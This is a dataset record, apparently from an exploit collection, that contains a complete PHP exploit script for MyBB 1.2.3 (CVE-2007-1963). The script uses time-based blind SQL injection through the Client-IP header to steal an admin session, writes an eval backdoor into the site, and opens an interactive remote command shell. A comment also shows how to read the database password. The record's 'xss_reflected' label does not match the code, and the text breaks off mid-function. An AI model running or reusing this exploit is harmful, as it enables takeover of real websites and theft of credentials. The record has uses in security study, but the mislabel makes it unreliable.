{
  "id": "3653",
  "title": "MyBulletinBoard (MyBB) 1.2.3 - Remote Code Execution",
  "cve": "CVE-2007-1963",
  "vuln_type": "xss_reflected",
  "code": "#!/usr/bin/php\r\n<?php\r\nerror_reporting(E_ALL ^ E_NOTICE);\r\n\r\n# http://www.milw0rm.com/exploits/2012\r\n# They corrected (not all) a lot of SQL requests which use the ipaddress, with $db->escape_string.\r\n# They don't corrected the function (this is a choice ... the bad) and they forgot to correct 1 (only) SQL request.\r\n# They must correct the problem at the source =)\r\n#\r\nif($argc < 3)\r\n{\r\nprint(\"\r\n---  MyBulletinBoard (MyBB) <= 1.2.3 Remote Code Execution Exploit  ---\r\n-----------------------------------------------------------------------\r\nPHP conditions: none\r\n       Credits: DarkFig <gmdarkfig@gmail.com>\r\n           URL: http://www.acid-root.new.fr/\r\n-----------------------------------------------------------------------\r\n  Usage: $argv[0] -url http://victim.com/ [Options]\r\n Params: -url       For example http://victim.com/myBB/\r\nOptions: -debug     Debug mod activated (debug_mybb.html)\r\n         -truetime  Server response time which returns true\r\n         -benchmark You can change the value used in benchmark()\r\n         -proxy     If you wanna use a proxy <proxyhost:proxyport> \r\n         -proxyauth Basic authentification <proxyuser:proxypwd>\r\n   Note: If you have some problems use -debug, -benchmark, -truetime\r\n-----------------------------------------------------------------------\r\n\");exit(1);\r\n}\r\n\r\n$url       = getparam('url',1);\r\n$debug     = (getparam('debug')!='')     ? 1 : 0;\r\n$benchmark = (getparam('benchmark')!='') ? getparam('benchmark') : '1000000';\r\n$proxy     = getparam($proxy);\r\n$proxyauth = getparam($proxyauth);\r\n\r\n$backdoor  = 'uploads/avatars/backdoor.php'; # inc/cache/backdoor.php\r\n$filetoed  = 'index.lang.php';\r\n\r\n$xpl = new phpsploit();\r\n$xpl->agent('Firefox');\r\nif($proxy) $xpl->proxy($proxy);\r\nif($proxyauth) $xpl->proxyauth($proxyauth);\r\nif($debug) debug(1);\r\n\r\n# There is two solutions to be logged in as administrator.\r\n#\r\n# SOLUTION NUMBER 1\r\n# mysql> select * from mybb_users\\G\r\n# *************************** 1. row ***************************\r\n#              uid: 1\r\n#         username: root\r\n#         password: 39ac8681f5cf4fcd9c9c09719a618bd3\r\n#             salt: BFeJBOCF\r\n#         loginkey: VYLJia9InmLgM1PT6v2whyMbaoSuprngLnkW55j3zlywItyZBA...\r\n#\r\n# $xpl->post($url.'admin/index.php','username=root&password=toor&do=login&goto=');\r\n# print $xpl->getcontent(); // ...Welcome to the MyBB Administration Control Panel...\r\n# \r\n# SOLUTION NUMBER 2\r\n# mysql> select * from mybb_adminsessions\\G\r\n# *************************** 1. row ***************************\r\n#        sid: 81e267263b9254f3aaf670383bfbfec9\r\n#        uid: 1\r\n#   loginkey: VYLJia9InmLgM1PT6v2whyMbaoSuprngLnkW55j3zlywItyZBA\r\n#         ip: 127.0.0.1\r\n#   dateline: 1175443967\r\n# lastactive: 1175444369\r\n#\r\n# $xpl->addheader('Client-IP','127.0.0.1');\r\n# $xpl->get($url.'admin/index.php?adminsid=81e267263b9254f3aaf670383bfbfec9');\r\n# print $xpl->getcontent(); // ...Welcome to the MyBB Administration Control Panel...\r\n#\r\n# I decided to use the solution number 2.\r\n# We can also add an administrator (easily) ... but it's not interesting.\r\n#\r\nprint \"\\nAdmin IP : \"; $ip  = sql_inject('ip');\r\nprint \"\\nAdmin sid: \"; $sid = sql_inject('sid');\r\nprint \"\\nTrying to be logged in as administrator\";\r\n\r\n$xpl->addheader('Client-IP',$ip);\r\n$xpl->get($url.\"admin/languages.php?adminsid=$sid\");\r\n\r\n# Trying to find the language\r\nif(preg_match('#<input type=\"hidden\" name=\"lang\" value=\"(\\S*)\"#',$xpl->getcontent(),$langmatches)) $lang=$langmatches[1];\r\nelse $lang='english';\r\nprint \"\\nLanguage: $lang\";\r\n\r\n# Language configuration\r\n$xpl->get($url.\"admin/languages.php?adminsid=$sid&action=edit&lang=$lang&editwith=0&file=$filetoed\");\r\npreg_match_all('#name=\"(.*)\">(.*)&lt;/textarea&gt;#',$xpl->getcontent(),$name_value);\r\n\r\n# We can't use:\r\n# - <? OR <?php\r\n# - <script language=\"php\">\r\n# - ' OR \"\r\n#\r\n$PHPCODE = '${${error_reporting(0)}}'\r\n          .'${${$handle=fopen('.chrit('./'.$backdoor).','.chrit('w').')}}'\r\n          .'${${fwrite($handle,'.chrit('<?php error_reporting(0);eval($_SERVER[HTTP_SHELL]);exit(0); ?>').')}}'\r\n          .'${${fclose($handle)}}';\r\n$name_value[2][0] .= $PHPCODE;\r\n\r\n$postdata=array(frmdt_url => $url.'admin/languages.php',\r\n               \"adminsid\" => $sid, \"action\" => \"do_edit\",\r\n               \"lang\" => $lang, \"editwith\" => 0,\r\n               \"inadmin\"=> 0, \"file\"=> $filetoed,\r\n               \"Update Language Variables\"=>\"  Update Language Variables\");\r\n\r\nfor($i=0;$i<count($name_value[1]);$i++)\t$postdata[html_entity_decode($name_value[1][$i])] = html_entity_decode($name_value[2][$i]);\r\n\r\n# print $xpl->showlastrequest();\r\n$xpl->formdata($postdata);\r\n\r\n# Trying to execute the php code\r\n$xpl->get($url.'index.php');\r\n\r\n# If not the default language\r\n$xpl->get($url.'inc/languages/'.$lang.'/'.$filetoed);\r\nprint \"\\nThe php file should be created\\n\\$shell> \";\r\n\r\n# Hello master\r\nwhile(!preg_match(\"#^(quit|exit)$#\",($cmd = trim(fgets(STDIN)))))\r\n{\r\n    # ');include('../../inc/config.php');print $config['password'];//\r\n    $xpl->addheader('Shell',\"system('$cmd');\");\r\n    $xpl->get($url.$backdoor);\r\n    print $xpl->getcontent().\"\\n\\$shell> \";\r\n}\r\n\r\nfunction sql_inject($field)\r\n{\r\n\tglobal $xpl,$url,$prefix,$debug,$result,$bef,$aft,$truetime,$benchmark,$a,$b,$sub,$f; #,$fakeip\r\n\t$sub=0;$string='';\r\n\t\r\n\tif($field=='ip') {$a='44';$b='57';} # . 0-9\r\n\telse {$a='46';$b='70';}             # 0-9 A-Z\r\n\t\r\n\twhile(TRUE)\r\n\t{\r\n\t\t$sub++;\r\n\t\tfor($i=$a;$i<=$b;$i++)\r\n\t\t{\r\n\t\t\t# Random ip\r\n\t\t\t$fakeip = rand(128,254).'.'\r\n\t\t\t         .rand(128,254).'.'\r\n\t\t\t         .rand(128,254).'.'\r\n\t\t\t         .rand(128,254);\r\n\r\n\t\t\t# Calculation of the server response time which returns TRUE\r\n\t\t\tif($i==$a) $f='TST';\r\n\t\t\t\r\n\t\t\t# End of the string ?\r\n\t\t\telseif($i==($a+1)) $f='NULL';\r\n\t\t\t\r\n\t\t\t# Test the char\r\n\t\t\telse $f=$i;\r\n\t\t\t\r\n\t\t\t# Table prefix\r\n\t\t\tif($sub==1 AND $i==$a)\r\n\t\t\t{\r\n\t\t\t\t$xpl->addheader('Client-IP',$fakeip.\"'<script>alert(666)</script>\");\r\n\t\t\t\t$xpl->get($url.'index.php');\r\n\r\n\t\t\t\tif(preg_match(\"#DELETE FROM (\\S*)sessions#i\",$xpl->getcontent(),$match)) $prefix=$match[1];\r\n\t\t\t\telse $prefix='mybb_';\r\n\t\t\t}\r\n\r\n\t\t\t# +-class_session.php (#2)\r\n\t\t\t# |\r\n\t\t\t# 475.\tfunction create_session($uid=0)\r\n\t\t\t# 476.\t{\r\n\t\t\t# 477.\t\tglobal $db;\r\n\t\t\t# 478.\t\t$speciallocs = $this->get_special_locations();\r\n\t\t\t# 479.\r\n\t\t\t# 480.\t\t// If there is a proper uid, delete by uid.\r\n\t\t\t# 481.\t\tif($uid > 0)\r\n\t\t\t# 482.\t\t{\r\n\t\t\t# 483.\t\t\t$db->delete_query(TABLE_PREFIX.\"sessions\", \"uid=\".$uid);\r\n\t\t\t# 484.\t\t\t$onlinedata['uid'] = $uid;\r\n\t\t\t# 485.\t\t}\r\n\t\t\t# 486.\t\t// Else delete by ip.\r\n\t\t\t# 487.\t\telse\r\n\t\t\t# 488.\t\t{   // $this->ipaddress = get_ip();\r\n\t\t\t# 489.\t\t\t$db->delete_query(TABLE_PREFIX.\"sessions\", \"ip='\".$this->ipaddress.\"'\");\r\n\t\t\t# 490.\t\t\t$onlinedata['uid'] = 0;\r\n\t\t\t# 491.\t\t}\r\n\t\t\t#\r\n\t\t\t$sql  = $fakeip.\"' OR ip=(SELECT IF(SUBSTR(\";\r\n\t\t\t$sql .= ($f=='TST') ? \"(SELECT 1)\" : \"(SELECT $field FROM ${prefix}adminsessions ORDER BY lastactive DESC LIMIT 1)\";\r\n\t\t\t$sql .= ($f=='TST') ? \",1\" : \",$sub\";\r\n\t\t\t$sql .= ($f=='TST') ? \",1)=CHAR(49)\" : \",1)=CHAR($f)\";\r\n\t\t\t$sql .= \",BENCHMARK($benchmark,CHAR(66)),1)) #\";\r\n\r\n\r\n\t\t\t# +-functions.php (#1)\r\n\t\t\t# |\r\n\t\t\t# 1836. function get_ip()\r\n\t\t\t# 1837. {\r\n\t\t\t# 1838.\tif(isset($_SERVER['HTTP_X_FORWARDED_FOR']))\r\n\t\t\t# 1839.\t{\r\n\t\t\t# 1840.\t\tif(preg_match_all(\"#[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}#s\", $_SERVER['HTTP_X_FORWARDED_FOR'], $addresses))\r\n\t\t\t# 1841.\t\t{\r\n\t\t\t# 1842.\t\t\tforeach($addresses[0] as $key => $val)\r\n\t\t\t# 1843.\t\t\t{\r\n\t\t\t# 1844.\t\t\t\tif(!preg_match(\"#^(10|172\\.16|192\\.168)\\.#\", $val))\r\n\t\t\t# 1845.\t\t\t\t{\r\n\t\t\t# 1846.\t\t\t\t\t$ip = $val;\r\n\t\t\t# 1847.\t\t\t\t\tbreak;\r\n\t\t\t# 1848.\t\t\t\t}\r\n\t\t\t# 1849.\t\t\t}\r\n\t\t\t# 1850.\t\t}\r\n\t\t\t# 1851.\t}\r\n\t\t\t# 1852.\tif(!isset($ip))\r\n\t\t\t# 1853.\t{\r\n\t\t\t# 1854.\t\tif(isset($_SERVER['HTTP_CLIENT_IP']))\r\n\t\t\t# 1855.\t\t{\r\n\t\t\t# 1856.\t\t\t$ip = $_SERVER['HTTP_CLIENT_IP'];\r\n\t\t\t# 1857.\t\t}\r\n\t\t\t# 1858.\t\telse\r\n\t\t\t# 1859.\t\t{\r\n\t\t\t# 1860.\t\t\t$ip = $_SERVER['REMOTE_ADDR'];\r\n\t\t\t# 1861.\t\t}\r\n\t\t\t# 1862.\t}\r\n\t\t\t# 1863.\treturn $ip;\r\n\t\t\t# 1864. }\r\n\t\t\t#\r\n\t\t\t$bef = time();\r\n\t\t\t$xpl->reset('header');\r\n\t\t\t$xpl->addheader('Client-IP',$sql);\r\n\t\t\t$xpl->get($url.'index.php');\r\n\t\t\t$aft = time();\r\n\t\t\t\r\n\t\t\tif($f=='TST') $truetime=$aft-$bef;\r\n\t\t\tif(getparam('truetime')!='') $truetime=getparam('truetime');\r\n\t\t\t\r\n\t\t\t# Server response time >= Server response time which returns TRUE ?\r\n\t\t\t$restime = $aft-$bef;\r\n\t\t\tif($restime >= $truetime AND $f != 'TST') $result='TRUE';\r\n\t\t\telse $result='FALSE';\r\n\r\n\t\t\t# Debug mode activated\r\n\t\t\tif($debug) debug('',$field);\r\n\t\t\t\r\n\t\t\t# The tested char returns TRUE\r\n\t\t\tif($result=='TRUE')\r\n\t\t\t{\r\n\t\t\t\tif($f!='NULL')\r\n\t\t\t\t{\r\n\t\t\t\t\t# Continue\r\n\t\t\t\t\tprint strtolower(chr($f));\r\n\t\t\t\t\t$string .= chr($f);\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\t# End of the string\r\n\t\t\t\t\t$xpl->reset('header');\r\n\t\t\t\t\treturn $string;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\t# Retry if no char found\r\n\t\t\tif($f==$b) $sub--;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nfunction debug($init='',$dafield='')\r\n{\r\n\tglobal $result,$bef,$aft,$truetime,$benchmark,$a,$b,$sub,$f; #,$fakeip\r\n\tif($init)\r\n\t{\r\n\t\t$handle = fopen(\"debug_mybb.html\",\"w+\");\r\n\t\t$data = \"<h1><div align='center'>MyBulletinBoard (MyBB) &lt;= 1.2.3 Code Execution Exploit</div></h1>\r\n\t\t<pre><table width='0' border='1' align='center' cellspacing='0'><tr>\r\n\t\t<td align='center'><b>REQUEST TIME</b></td>\r\n\t\t<td align='center'><b>RESPONSE TIME</b></td>\r\n\t\t<td align='center'><b>TRUETIME</b></td>\r\n\t\t<td align='center'><b>BENCHMARK</b></td>\r\n\t\t<td align='center'><b>RESULT</b></td>\";\r\n\t\t# <td align='center'><b>IP</b></td>\r\n\t\t$data .= \"<td align='center'><b>FIELD</b></td>\r\n\t\t<td align='center'><b>CHARSET</b></td>\r\n\t\t<td align='center'><b>SUBSTR()</b></td>\r\n\t\t<td align='center'><b>ORD()</b></td>\r\n\t\t<td align='center'><b>CHAR()</b></td>\";\r\n\t\tfwrite($handle,$data);\r\n\t\tfclose($handle);\r\n\t}\r\n\telse\r\n\t{\r\n\t\t$handle = fopen(\"debug_mybb.html\",\"a\");\r\n\t\t$data   = \"<tr\".(($result=='TRUE') ? \" bgcolor='#FFFF00'\" : \"\").\">\r\n\t\t<td align='center'>&nbsp;\".htmlentities($bef).\"&nbsp;</td>\r\n\t\t<td align='center'>&nbsp;\".htmlentities($aft).\"&nbsp;</td>\r\n\t\t<td align='center'>&nbsp;\".htmlentities($truetime).\"&nbsp;</td>\r\n\t\t<td align='center'>&nbsp;\".htmlentities($benchmark).\"&nbsp;</td>\r\n\t\t<td align='center'>&nbsp;\".htmlentities($result).\"&nbsp;</td>\";\r\n\t\t# <td align='center'>&nbsp;\".htmlentities($fakeip).\"&nbsp;</td>\r\n\t\t$data .= \"<td align='center'>&nbsp;\".htmlentities($dafield).\"&nbsp;</td>\r\n\t\t<td align='center'>&nbsp;\".htmlentities(\"$a-$b\").\"&nbsp;</td>\r\n\t\t<td align='center'>&nbsp;\".htmlentities($sub).\"&nbsp;</td>\r\n\t\t<td align='center'>&nbsp;\".htmlentities($f).\"&nbsp;</td>\r\n\t\t<td align='center'>&nbsp;\".htmlentities(chr($f)).\"&nbsp;</td></tr>\";\r\n\t\tfwrite($handle,$data);\r\n\t\tfclose($handle);\r\n\t}\r\n}\r\n\r\nfunction chrit($string)\r\n{\r\n\t$char = '';\r\n\tfor($i=0;$i<strlen($string);$i++)\r\n\t{\r\n\t\t$char .= 'chr('.ord($string[$i]).')';\r\n\t\t$char .= ($i != (strlen($string)-1)) ? '.' : '';\r\n\t}\r\n\treturn $char;\r\n}\r\n\r\nfunction getparam($param,$opt='')\r\n{\r\n\tglobal $argv;\r\n\tforeach($argv as $value => $key)\r\n\t{\r\n\t\tif($key == '-'.$param) {\r\n\t\t   if(!empty($argv[$value+1])) return $argv[$value+1];\r\n\t\t   else return 1;\r\n\t\t}\r\n\t}\r\n\tif($opt) exit(\"\\n-$param parameter required\");\r\n\telse return;\r\n}\r\n\r\n/*\r\n * \r\n * Copyright (C) darkfig\r\n * \r\n * This program is free software; you can redistribute it and/or \r\n * modify it under the terms of the GNU General Public License \r\n * as published by the Free Software Foundation; either version 2 \r\n * of the License, or (at your option) any later version. \r\n * \r\n * This program is distributed in the hope that it will be useful, \r\n * but WITHOUT ANY WARRANTY; without even the implied warranty of \r\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the \r\n * GNU General Public License for more details. \r\n * \r\n * You should have received a copy of the GNU General Public License \r\n * along with this program; if not, write to the Free Software \r\n * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\r\n * \r\n * TITLE:          PhpSploit Class\r\n * REQUIREMENTS:   PHP 5 (remove \"private\", \"public\" if you have PHP 4)\r\n * VERSION:        1.2\r\n * LICENSE:        GNU General Public License\r\n * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt\r\n * FILENAME:       phpsploitclass.php\r\n *\r\n * CONTACT:        gmdarkfig@gmail.com (french / english)\r\n * GREETZ:         Sparah, Ddx39\r\n *\r\n * DESCRIPTION:\r\n * The phpsploit is a class implementing a web user agent.\r\n * You can add cookies, headers, use a proxy server with (or without) a\r\n * basic authentification. It supports the GET and the POST method. It can\r\n * also be used like a browser with the cookiejar() function (which allow\r\n * a server to add several cookies for the next requests) and the\r\n * allowredirection() function (which allow the script to follow all\r\n * redirections sent by the server). It can return the content (or the\r\n * headers) of the request. Others useful functions can be used for debugging.\r\n * A manual is actually in development but to know how to use it, you can\r\n * read the comments.\r\n *\r\n * CHANGELOG:\r\n * [2007-01-24] (1.2)\r\n *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))\r\n *  * New: multipart/form-data enctype is now supported \r\n *\r\n * [2006-12-31] (1.1)\r\n *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)\r\n *  * New: You can now call the getheader() / getcontent() function without parameters\r\n *\r\n * [2006-12-30] (1.0)\r\n *  * First version\r\n * \r\n */\r\n\r\nclass phpsploit {\r\n\r\n\t/**\r\n\t * This function is called by the get()/post() functions.\r\n\t * You don't have to call it, this is the main function.\r\n\t *\r\n\t * @return $server_response\r\n\t */\r\n\tprivate function sock()\r\n\t{\r\n\t\tif(!empty($this->proxyhost) && !empty($this->proxyport)) $socket = fsockopen($this->proxyhost,$this->proxyport);\r\n\t\telse $socket = fsockopen($this->host,$this->port);\r\n\t\t\r\n\t\tif(!$socket) die(\"Error: The host doesn't exist\");\r\n\t\t\r\n\t\tif($this->method===\"get\") $this->packet = \"GET \".$this->url.\" HTTP/1.1\\r\\n\";\r\n\t\telseif($this->method===\"post\" or $this->method===\"formdata\") $this->packet = \"POST \".$this->url. \" HTTP/1.1\\r\\n\";\r\n\t\telse die(\"Error: Invalid method\");\r\n\t\t\r\n\t\tif(!empty($this->proxyuser)) $this->packet .= \"Proxy-Authorization: Basic \".base64_encode($this->proxyuser.\":\".$this->proxypass).\"\\r\\n\";\r\n\t\t$this->packet .= \"Host: \".$this->host.\"\\r\\n\";\r\n\t\t\r\n\t\tif(!empty($this->agent))  $this->packet .= \"User-Agent: \".$this->agent.\"\\r\\n\";\r\n\t\tif(!empty($this->header)) $this->packet .= $this->header.\"\\r\\n\";\r\n\t\tif(!empty($this->cookie)) $this->packet .= \"Cookie: \".$this->cookie.\"\\r\\n\";\r\n\t\t\r\n\t\t$this->packet .= \"Connection: Close\\r\\n\";\r\n\t\tif($this->method===\"post\")\r\n\t\t{\r\n\t\t\t$this->packet .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n\t\t\t$this->packet .= \"Content-Length: \".strlen($this->data).\"\\r\\n\\r\\n\";\r\n\t\t\t$this->packet .= $this->data.\"\\r\\n\";\r\n\t\t}\r\n\t\telseif($this->method===\"formdata\")\r\n\t\t{\r\n\t\t\t$this->packet .= \"Content-Type: multipart/form-data; boundary=---------------------------\".$this->boundary.\"\\r\\n\";\r\n\t\t\t$this->packet .= \"Content-Length: \".strlen($this->data).\"\\r\\n\\r\\n\";\r\n\t\t\t$this->packet .= $this->data;\r\n\t\t}\r\n\t\t$this->packet .= \"\\r\\n\";\r\n\t\t$this->recv = '';\r\n\t\t\r\n\t\tfputs($socket,$this->packet);\r\n\t\twhile(!feof($socket)) $this->recv .= fgets($socket);\r\n\t\tfclose($socket);\r\n\t\t\r\n\t\tif($this->cookiejar) $this->cookiejar($this->getheader($this->recv));\r\n\t\tif($this->allowredirection) return $this->allowredirection($this->recv);\r\n\t\telse return $this->recv;\r\n\t}\r\n\t\r\n\r\n\t/**\r\n\t * This function allows you to add several cookie in the\r\n\t * request. Several methods are supported:\r\n\t * \r\n\t * $this->addcookie(\"name\",\"value\");\r\n\t * or\r\n\t * $this->addcookie(\"name=newvalue\");\r\n\t * or\r\n\t * $this->addcookie(\"othername=overvalue; xx=zz; y=u\");\r\n\t * \r\n\t * @param string $cookiename\r\n\t * @param string $cookievalue\r\n\t * \r\n\t */\r\n\tpublic function addcookie($cookn,$cookv='')\r\n\t{\r\n\t\t// $this->addcookie(\"name\",\"value\"); work avec replace\r\n\t\tif(!empty($cookv))\r\n\t\t{\r\n\t\t\tif($cookv === \"deleted\") $cookv=''; // cookiejar(1) && Set-Cookie: name=delete\r\n\t\t\tif(!empty($this->cookie))\r\n\t\t\t{\r\n\t\t\t    if(preg_match(\"/$cookn=/\",$this->cookie))\r\n\t\t\t    {\r\n\t\t\t    \t$this->cookie = preg_replace(\"/$cookn=(\\S*);/\",\"$cookn=$cookv;\",$this->cookie);\r\n\t\t\t    }\r\n\t\t\t    else\r\n\t\t\t    {\r\n\t\t\t    \t$this->cookie .= \" \".$cookn.\"=\".$cookv.\";\"; // \" \".\r\n\t\t\t    }\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\t$this->cookie = $cookn.\"=\".$cookv.\";\";\r\n\t\t\t}\r\n\t\t}\r\n\t\t// $this->addcookie(\"name=value; othername=othervalue\");\r\n\t\telse\r\n\t\t{\r\n\t    \t if(!empty($this->cookie))\r\n\t    \t {\r\n\t    \t \t$cookn = preg_replace(\"/(.*);$/\",\"$1\",$cookn);\r\n\t    \t \t$cookarr = explode(\";\",str_replace(\" \", \"\",$cookn));\r\n\t    \t \tfor($i=0;$i<count($cookarr);$i++)\r\n\t    \t \t{\r\n\t    \t \t\tpreg_match(\"/(\\S*)=(\\S*)/\",$cookarr[$i],$matches);\r\n\t    \t \t\t$cookn = $matches[1];\r\n\t    \t \t\t$cookv = $matches[2];\r\n\t    \t \t\t$this->addcookie($cookn,$cookv);\r\n\t    \t \t}\r\n\t    \t }\r\n\t\t\t else\r\n\t\t\t {\r\n\t\t\t \t$cookn = ((substr($cookn,(strlen($cookn)-1),1))===\";\") ? $cookn : $cookn.\";\";\r\n\t\t\t \t$this->cookie = $cookn;\t\t\t\r\n\t\t\t }\r\n\t\t}\r\n\t}\r\n\t\r\n\t\r\n\t/**\r\n\t * This function allows you to add several headers in the\r\n\t * request. Several methods are supported:\r\n\t *\r\n\t * $this->addheader(\"headername\",\"headervalue\");\r\n\t * or\r\n\t * $this->addheader(\"headername: headervalue\");\r\n\t *\r\n\t * @param string $headername\r\n\t * @param string $headervalue\r\n\t */\r\n\tpublic function addheader($headern,$headervalue='')\r\n\t{\r\n\t\t// $this->addheader(\"name\",\"value\");\r\n\t\tif(!empty($headervalue))\r\n\t\t{\r\n\t\t\tif(!empty($this->header))\r\n\t\t\t{\r\n\t\t\t\tif(preg_match(\"/$headern:/\",$this->header))\r\n\t\t\t\t{\r\n\t\t\t\t\t$this->header = preg_replace(\"/$headern: (\\S*)/\",\"$headern: $headervalue\",$this->header);\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\t$this->header .= \"\\r\\n\".$headern.\": \".$headervalue;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\t$this->header=$headern.\": \".$headervalue;\r\n\t\t\t}\r\n\t\t}\r\n\t\t// $this->addheader(\"name: value\");\r\n\t\telse \r\n\t\t{\r\n\t\t\tif(!empty($this->header))\r\n\t\t\t{\r\n\t\t\t\t$headarr = explode(\": \",$headern);\r\n\t\t\t\t$headern = $headarr[0];\r\n\t\t\t\t$headerv = $headarr[1];\r\n\t\t\t\t$this->addheader($headern,$headerv);\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\t$this->header=$headern;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\r\n\r\n\t/**\r\n\t * This function allows you to use an http proxy server.\r\n\t * Several methods are supported:\r\n\t * \r\n\t * $this->proxy(\"proxyip\",\"8118\");\r\n\t * or\r\n\t * $this->proxy(\"proxyip:8118\")\r\n\t *\r\n\t * @param string $proxyhost\r\n\t * @param integer $proxyport\r\n\t */\r\n\tpublic function proxy($proxy,$proxyp='')\r\n\t{\r\n\t\t// $this->proxy(\"localhost:8118\");\r\n\t\tif(empty($proxyp))\r\n\t\t{\r\n\t\t\tpreg_match(\"/^(\\S*):(\\d+)$/\",$proxy,$proxarr);\r\n\t\t\t$proxh = $proxarr[1];\r\n\t\t\t$proxp = $proxarr[2];\r\n\t\t\t$this->proxyhost=$proxh;\r\n\t\t\t$this->proxyport=$proxp;\r\n\t\t}\r\n\t\t// $this->proxy(\"localhost\",8118);\r\n\t\telse \r\n\t\t{\r\n\t\t\t$this->proxyhost=$proxy;\r\n\t\t\t$this->proxyport=intval($proxyp);\r\n\t\t}\r\n\t\tif($this->proxyport > 65535) die(\"Error: Invalid port number\");\r\n\t}\r\n\t\r\n\r\n\t/**\r\n\t * This function allows you to use an http proxy server\r\n\t * which requires a basic authentification. Several\r\n\t * methods are supported:\r\n\t * \r\n\t * $this->proxyauth(\"darkfig\",\"dapasswd\");\r\n\t * or\r\n\t * $this->proxyauth(\"darkfig:dapasswd\");\r\n\t *\r\n\t * @param string $proxyuser\r\n\t * @param string $proxypass\r\n\t */\r\n\tpublic function proxyauth($proxyauth,$proxypasse='')\r\n\t{\r\n\t\t// $this->proxyauth(\"darkfig:password\");\r\n\t\tif(empty($proxypasse))\r\n\t\t{\r\n\t\t\tpreg_match(\"/^(.*):(.*)$/\",$proxyauth,$proxautharr);\r\n\t\t\t$proxu = $proxautharr[1];\r\n\t\t\t$proxp = $proxautharr[2];\r\n\t\t\t$this->proxyuser=$proxu;\r\n\t\t\t$this->proxypass=$proxp;\r\n\t\t}\r\n\t\t// $this->proxyauth(\"darkfig\",\"password\");\r\n\t\telse\r\n\t\t{\r\n\t\t\t$this->proxyuser=$proxyauth;\r\n\t\t\t$this->proxypass=$proxypasse;\r\n\t\t}\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function allows you to set the \"User-Agent\" header.\r\n\t * Several methods are possible to do that:\r\n\t * \r\n\t * $this->agent(\"Mozilla Firefox\");\r\n\t * or\r\n\t * $this->addheader(\"User-Agent: Mozilla Firefox\");\r\n\t * or\r\n\t * $this->addheader(\"User-Agent\",\"Mozilla Firefox\");\r\n\t * \r\n\t * @param string $useragent\r\n\t */\r\n\tpublic function agent($useragent)\r\n\t{\r\n\t\t$this->agent=$useragent;\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function returns the header which will be\r\n\t * in the next request.\r\n\t * \r\n\t * $this->showheader();\r\n\t *\r\n\t * @return $header\r\n\t */\r\n\tpublic function showheader()\r\n\t{\r\n\t\treturn $this->header;\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function returns the cookie which will be\r\n\t * in the next request.\r\n\t * \r\n\t * $this->showcookie();\r\n\t *\r\n\t * @return $storedcookies\r\n\t */\r\n\tpublic function showcookie()\r\n\t{\r\n\t\treturn $this->cookie;\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function returns the last formed\r\n\t * http request (the http packet).\r\n\t * \r\n\t * $this->showlastrequest();\r\n\t * \r\n\t * @return $last_http_request\r\n\t */\r\n\tpublic function showlastrequest()\r\n\t{\r\n\t\treturn $this->packet;\r\n\t}\r\n\t\r\n\t\r\n\t/**\r\n\t * This function sends the formed http packet with the\r\n\t * GET method. You can precise the port of the host.\r\n\t * \r\n\t * $this->get(\"http://localhost\");\r\n\t * $this->get(\"http://localhost:888/xd/tst.php\");\r\n\t * \r\n\t * @param string $urlwithpath\r\n\t * @return $server_response\r\n\t */\r\n\tpublic function get($url)\r\n\t{\r\n\t\t$this->target($url);\r\n\t\t$this->method=\"get\";\r\n\t\treturn $this->sock();\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function sends the formed http packet with the\r\n\t * POST method. You can precise the port of the host.\r\n\t * \r\n\t * $this->post(\"http://localhost/index.php\",\"admin=1&user=dark\");\r\n\t *\r\n\t * @param string $urlwithpath\r\n\t * @param string $postdata\r\n\t * @return $server_response\r\n\t */\t\r\n\tpublic function post($url,$data)\r\n\t{\r\n\t\t$this->target($url);\r\n\t\t$this->method=\"post\";\r\n\t\t$this->data=$data;\r\n\t\treturn $this->sock();\r\n\t}\r\n\t\r\n\r\n\t/**\r\n\t * This function sends the formed http packet with the\r\n\t * POST method using the multipart/form-data enctype. \r\n\t * \r\n\t * $array = array(\r\n\t *          frmdt_url      => \"http://localhost/upload.php\",\r\n\t *          frmdt_boundary => \"123456\",                    # Optional\r\n\t *                 \"email\" => \"me@u.com\",\r\n\t *               \"varname\" => array(\r\n\t *                            frmdt_type => \"image/gif\",   # Optional\r\n\t *                       frmdt_transfert => \"binary\",      # Optional\r\n\t *                        frmdt_filename => \"hello.php\",\r\n\t *                         frmdt_content => \"<?php echo ':)'; ?>\"));\r\n\t * $this->formdata($array);\r\n\t *\r\n\t * @param array $array\r\n\t * @return $server_response\r\n\t */\r\n\tpublic function formdata($array)\r\n\t{\r\n\t\t$this->target($array[frmdt_url]);\r\n\t\t$this->method=\"formdata\";\r\n\t\t$this->data='';\r\n\t\tif(!isset($array[frmdt_boundary])) $this->boundary=\"phpsploit\";\r\n\t\telse $this->boundary=$array[frmdt_boundary];\r\n\t\tforeach($array as $key => $value)\r\n\t\t{\r\n\t\t\tif(!preg_match(\"#^frmdt_(boundary|url)#\",$key))\r\n\t\t\t{\r\n\t\t\t\t$this->data .= \"-----------------------------\".$this->boundary.\"\\r\\n\";\r\n\t\t\t\t$this->data .= \"Content-Disposition: form-data; name=\\\"\".$key.\"\\\";\";\r\n\t\t\t\tif(!is_array($value))\r\n\t\t\t\t{\r\n\t\t\t\t\t$this->data .= 